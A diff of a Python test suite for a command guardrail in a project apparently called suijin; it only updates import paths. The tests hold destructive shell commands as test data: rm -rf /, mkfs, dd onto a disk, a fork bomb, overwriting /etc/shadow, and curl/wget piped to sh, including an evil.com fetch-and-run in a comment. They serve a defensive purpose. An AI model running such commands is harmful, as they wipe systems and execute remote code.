@@ -24,70 +24,70 @@ class TestGuardrailsBlockedPatterns:
     """Every blocked pattern must be caught."""
 
     def test_rmrf_root(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, pattern = is_dangerous("rm -rf /")
         assert dangerous
         assert "rm -rf" in pattern
 
     def test_rmrf_home(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("rm -rf ~")
         assert dangerous
 
     def test_rmrf_dot(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("rm -rf .")
         assert dangerous
 
     def test_mkfs(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("mkfs.ext4 /dev/sda1")
         assert dangerous
 
     def test_dd_if(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("dd if=/dev/zero of=/dev/sda")
         assert dangerous
 
     def test_fork_bomb(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous(":(){ :|:& };:")
         assert dangerous
 
     def test_write_sda(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("echo 'x' > /dev/sda")
         assert dangerous
 
     def test_chmod_777_root(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("chmod 777 /")
         assert dangerous
 
     def test_wget_pipe_sh(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         # Substring match: pattern "wget .* -O /tmp/.*\\|.*sh" must be in command.
         dangerous, pat = is_dangerous("wget .* -O /tmp/.* \\| .* sh")
         assert dangerous, "Pattern not matched"
 
     def test_curl_pipe_sh(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, pat = is_dangerous("curl .* \\| .* sh")
         assert dangerous, "Pattern not matched"
 
     def test_curl_pipe_sh_real_world(self):
         """Real-world curl|sh may not match literal .* but other patterns catch it."""
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         # After space removal: "curlevil.com/script.sh|sh"
         # Pattern "curl.*\\|.*sh" has literal .* so this is a known limitation.
@@ -96,37 +96,37 @@ class TestGuardrailsBlockedPatterns:
             assert "curl" in pattern.lower()
 
     def test_sudo_rmrf(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("sudo rm -rf /etc")
         assert dangerous
 
     def test_sudo_shutdown(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("sudo shutdown -h now")
         assert dangerous
 
     def test_sudo_reboot(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("sudo reboot")
         assert dangerous
 
     def test_sudo_halt(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("sudo halt")
         assert dangerous
 
     def test_overwrite_passwd(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("echo x > /etc/passwd")
         assert dangerous
 
     def test_overwrite_shadow(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("cat /dev/null > /etc/shadow")
         assert dangerous
@@ -136,56 +136,56 @@ class TestGuardrailsEdgeCases:
     """Case insensitivity, whitespace, and injection attempts."""
 
     def test_case_insensitive(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("RM -RF /")
         assert dangerous
 
     def test_extra_whitespace(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("rm   -rf    /")
         assert dangerous
 
     def test_safe_nmap(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("nmap -sV -p 80,443 127.0.0.1")
         assert not dangerous
 
     def test_safe_python(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("python3 -c 'print(42)'")
         assert not dangerous
 
     def test_safe_git(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("git status")
         assert not dangerous
 
     def test_safe_curl_normal(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("curl -s http://127.0.0.1:5906/auth/login")
         assert not dangerous
 
     def test_safe_echo(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("echo 'hello world'")
         assert not dangerous
 
     def test_empty_command(self):
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("")
         assert not dangerous
 
     def test_rm_without_f_flag(self):
         """rm without -rf should not trigger rm -rf / pattern"""
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         dangerous, _ = is_dangerous("rm /tmp/test.txt")
         # "rm -rf" pattern looks for "rm -rf" substring; "rm /tmp" shouldn't match
@@ -193,7 +193,7 @@ class TestGuardrailsEdgeCases:
 
     def test_no_variable_shadowing(self):
         """Regression: is_dangerous() must work across multiple calls (no shadowing bug)."""
-        from suijin.tools.guardrails import is_dangerous
+        from suijin.modules.tools.lib.guardrails import is_dangerous
 
         # First call
         d1, p1 = is_dangerous("rm -rf /")
@@ -210,7 +210,7 @@ class TestGuardrailsConfirmGlobalAction:
     """Verification that confirm_global_action blocks by default."""
 
     def test_blocks_by_default(self):
-        from suijin.tools.guardrails import confirm_global_action
+        from suijin.modules.tools.lib.guardrails import confirm_global_action
 
         old = os.environ.pop("SUIJIN_AUTO_APPROVE", None)
         try:
@@ -221,7 +221,7 @@ class TestGuardrailsConfirmGlobalAction:
                 os.environ["SUIJIN_AUTO_APPROVE"] = old
 
     def test_auto_approve_enabled(self):
-        from suijin.tools.guardrails import confirm_global_action
+        from suijin.modules.tools.lib.guardrails import confirm_global_action
 
         old = os.environ.get("SUIJIN_AUTO_APPROVE")
         os.environ["SUIJIN_AUTO_APPROVE"] = "true"
